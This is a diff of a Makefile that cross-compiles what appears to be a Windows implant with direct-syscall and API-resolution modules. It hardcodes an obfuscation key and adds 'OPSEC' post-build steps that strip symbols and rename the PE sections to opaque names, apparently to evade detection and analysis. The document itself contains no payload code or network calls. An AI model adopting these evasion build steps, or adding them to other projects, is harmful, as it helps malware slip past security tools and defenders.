@@ -5,22 +5,18 @@
 CC = x86_64-w64-mingw32-g++
 AS = nasm
 
-OBF_KEY = $(shell python3 -c "import random; print(random.randint(1, 255))")
-
-
-STRIP_PATHS = -fmacro-prefix-map=$(CURDIR)=.
+# Static OBF_KEY — avoids python3 dependency issues on Windows
+OBF_KEY = 137
 
 # Compiler Flags
 CFLAGS = -std=c++14 -masm=intel -static -I. \
          -DOBF_KEY=$(OBF_KEY) \
-         $(STRIP_PATHS) \
-         -s -Os -flto -ffunction-sections -fdata-sections \
+         -s -Os -ffunction-sections -fdata-sections \
          -fno-exceptions -fno-rtti -mwindows -fno-ident
 
 # Linker Flags (OPSEC)
 LDFLAGS = -Wl,--build-id=none -Wl,--gc-sections \
-          -Wl,--dynamicbase -Wl,--nxcompat -Wl,--high-entropy-va -lws2_32
-
+          -Wl,--dynamicbase -Wl,--nxcompat -Wl,--high-entropy-va
 ASFLAGS = -f win64
 
 
@@ -38,10 +34,22 @@ OBJS = Core/main.o Core/api_resolve.o Core/syscalls.o Core/dispatcher.o \
        Utils/helpers.o
 
 
-all: $(OUT_FILE) post_build_cleanup
+all: $(OUT_FILE)
 
 $(OUT_FILE): $(OBJS)
 	$(CC) $(OBJS) -o $(OUT_FILE) $(CFLAGS) $(LDFLAGS) $(LIBS)
+	@echo "[*] Build successful: $(OUT_FILE)"
+	@echo "[*] Post-build OPSEC: stripping symbols..."
+	x86_64-w64-mingw32-strip --strip-all $(OUT_FILE)
+	@echo "[*] Post-build OPSEC: renaming sections..."
+	x86_64-w64-mingw32-objcopy \
+		--rename-section .text=.a \
+		--rename-section .rdata=.b \
+		--rename-section .data=.c \
+		--rename-section .pdata=.d \
+		--rename-section .xdata=.e \
+		$(OUT_FILE)
+	@echo "[*] Post-build OPSEC complete."
 
 Core/syscalls_asm.o: Core/syscalls_asm.asm
 	$(AS) $(ASFLAGS) $< -o $@
@@ -49,11 +57,6 @@ Core/syscalls_asm.o: Core/syscalls_asm.asm
 %.o: %.cpp
 	$(CC) -c $< -o $@ $(CFLAGS)
 
-
-post_build_cleanup: $(OUT_FILE)
-	@echo "[*] Build successful: $(OUT_FILE) (Key: $(OBF_KEY))"
-	@echo "[*] Running PE sanitization pipeline..."
-	@python3 pe_sanitizer.py $(OUT_FILE)
 
 clean:
 	rm -f $(OBJS) $(OUT_FILE)
